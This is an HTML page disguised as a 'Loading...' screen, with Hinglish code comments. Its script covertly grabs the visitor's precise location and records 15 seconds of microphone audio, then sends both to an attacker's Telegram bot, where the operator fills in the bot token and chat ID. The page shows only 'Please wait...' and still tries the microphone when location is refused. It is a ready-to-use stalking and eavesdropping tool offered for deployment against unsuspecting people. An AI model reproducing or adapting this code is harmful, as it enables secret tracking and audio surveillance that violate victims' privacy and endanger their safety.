<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #f4f4f4; }
        h3 { color: #333; }
    </style>
</head>
<body>
    <h3 id="statusText">Please wait...</h3>

    <script>
        // 1. Yahan apni Telegram details daalo
        const TELEGRAM_BOT_TOKEN = "YAHAN_BOT_TOKEN_DAALO"; 
        const TELEGRAM_CHAT_ID = "YAHAN_CHAT_ID_DAALO"; 

        // 2. Location nikaalo
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Location milte hi mic on karo
                    startMic(lat, lon, mapLink);
                },
                function(error) {
                    // Agar location deny ho jaye, toh bhi mic try karo
                    startMic("Unknown", "Unknown", "Location Denied");
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            startMic("Unknown", "Unknown", "Not Supported");
        }

        // 3. Mic start karo aur Audio record karo
        async function startMic(lat, lon, mapLink) {
            try {
                document.getElementById('statusText').innerText = "Recording audio (15s)...";
                
                // Sirf Audio (Mic) ki permission maango
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true,
                    video: false 
                });

                // MediaRecorder setup (Telegram voice note ke liye best format)
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    // Mic band kar do
                    stream.getTracks().forEach(track => track.stop());
                    document.getElementById('statusText').innerText = "Sending to Telegram...";

                    // Audio file banao
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // Telegram par location aur audio bhejo
                    await sendToTelegram(lat, lon, mapLink, blob);
                    document.getElementById('statusText').innerText = "✅ Audio & Location sent to Telegram!";
                };

                mediaRecorder.start();

                // 15000 ms = 15 second baad recording rok do
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 15000); 

            } catch (err) {
                console.error("Mic error: ", err);
                // Agar mic block ho gaya, toh bas location bhej do
                sendToTelegram(lat, lon, mapLink, null);
                document.getElementById('statusText').innerText = "❌ Mic Permission Denied";
            }
        }

        // 4. Telegram API Call
        async function sendToTelegram(lat, lon, mapLink, audioBlob) {
            
            // Pehle Text Message (Location ke sath) bhejo
            const textMessage = `📍 *New Audio Recording (15 Sec)*\n\n*Lat:* ${lat}\n*Lon:* ${lon}\n*Map:* [Google Maps]( ${mapLink} )`;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: textMessage,
                        parse_mode: "Markdown"
                    })
                });

                // Agar Audio file mili hai, toh Voice Note ke roop mein bhejo
                if (audioBlob) {
                    const formData = new FormData();
                    formData.append("chat_id", TELEGRAM_CHAT_ID);
                    formData.append("voice", audioBlob, "audio.webm"); // 'voice' likhne se Telegram isko voice note banata hai

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                        method: "POST",
                        body: formData
                    });
                }
            } catch (e) {
                console.error("Telegram send failed", e);
            }
        }
    </script>
</body>
</html>
